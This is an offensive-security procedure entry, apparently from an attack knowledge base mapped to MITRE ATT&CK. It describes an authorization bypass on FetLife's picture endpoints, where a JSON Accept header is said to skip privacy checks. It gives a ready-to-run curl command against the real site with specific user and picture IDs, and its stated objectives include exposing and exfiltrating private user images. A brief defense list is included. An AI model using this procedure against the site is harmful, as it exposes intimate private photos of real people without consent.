---
id: 568b4b36-1f1f-4db1-845c-56989f9f490f
name: Access-Private-FetLife-Pictures-via-JSON
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:34.921Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Data from Information Repositories]]'
tags:
  - authorization-bypass
  - json-api
  - information-disclosure
  - fetlife
  - pictures
commands:
  - '[[commands/curl-fetlife-private-picture-json]]'
platforms:
  - Web
tools:
  - '[[tools/curl]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Information Repositories]]'
---

# Access-Private-FetLife-Pictures-via-JSON

## Summary

This procedure exploits the authorization bypass in FetLife's picture endpoints by requesting JSON responses, allowing unauthorized retrieval of private user pictures when the resource ID is known, leading to sensitive image data disclosure.

## Description

FetLife's /users/{user-id}/pictures/{pic-id} endpoint skips access controls in JSON format, triggered by Accept: application/json. Attackers with a valid session cookie (even non-owner) can fetch private picture metadata and URLs. This targets privacy-protected content, enabling mass enumeration if IDs are predictable or leaked.

## Requirements

1. Valid FetLife session cookie (_fl_sessionid)
2. Target user ID and private picture ID
3. curl or equivalent HTTP client
4. HTTPS access to FetLife

## Defense

Defensive measures and detection strategies:

- Enforce uniform authorization for all Accept headers in API handlers
- Audit JSON responses for private resources and implement ID-based access logs
- Use content visibility flags checked server-side regardless of format

## Objectives

1. Retrieve private picture JSON data without authentication
2. Expose sensitive user media for further analysis or exfiltration
3. Demonstrate impact of broken access control

## Instructions

### Step 1: Prepare and Execute Request

**Context**: Send authenticated GET request with JSON header to bypass controls.

**Command** ([[commands/curl-fetlife-private-picture-json]]):
```bash
curl https://fetlife.com/users/14104003/pictures/120041856 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

> Replace {your-session} with actual cookie value. Expected output: JSON with picture details like URL, caption, and privacy status, accessible despite private setting.

### Step 2: Parse and Validate Output

**Context**: Confirm private content exposure by checking JSON fields.

Inspect the response for fields indicating private access, such as "visibility" or direct media links.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Data from Information Repositories]]

### Sub-Techniques


## Commands Used

- [[commands/curl-fetlife-private-picture-json]]

## Tools Used

- [[tools/curl]]

## Tags

- [[authorization-bypass]]
- [[information-disclosure]]
- [[pictures]]
